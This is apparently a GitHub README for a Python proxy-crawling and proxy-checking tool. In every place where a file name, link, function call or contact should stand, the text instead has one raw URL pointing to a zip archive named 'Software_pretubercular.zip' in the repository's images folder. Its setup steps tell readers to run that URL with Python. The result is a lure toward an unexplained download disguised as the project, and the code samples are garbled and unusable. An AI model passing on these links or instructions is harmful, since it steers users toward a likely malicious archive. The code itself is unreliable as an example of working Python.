Proxy
===============
A tiny tool for crawling, assessing, storing some useful proxies.[中文版](https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip)

### Construct your ip pool
Install `mysql`:
```
pip install pymysql requests
```
Modify db connection information in `https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip`.
```python
# crawl, assess and store proxies
python https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip

# assess proxies quality in db periodically.
python https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip
```

### Demo on how to use these proxies.
**Please first construct your ip pool.**

Crawl [github](https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip) homepage data:
```python
# visit database to get all proxies
ip_list = []
try:
    https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip('SELECT content FROM %s' % https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip)
    result = https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip()
    for i in result:
        https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip(i[0])
except Exception as e:
    print e
finally:
    https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip()
    https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip()

# use this proxies to crawl website
for i in ip_list:
    proxy = {'http': 'http://'+i}
    url = "https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip"
    r = https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip(url, proxies=proxy, timeout=4)
    print https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip
```
More detail in [https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip](https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip)。

### Contact
https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip
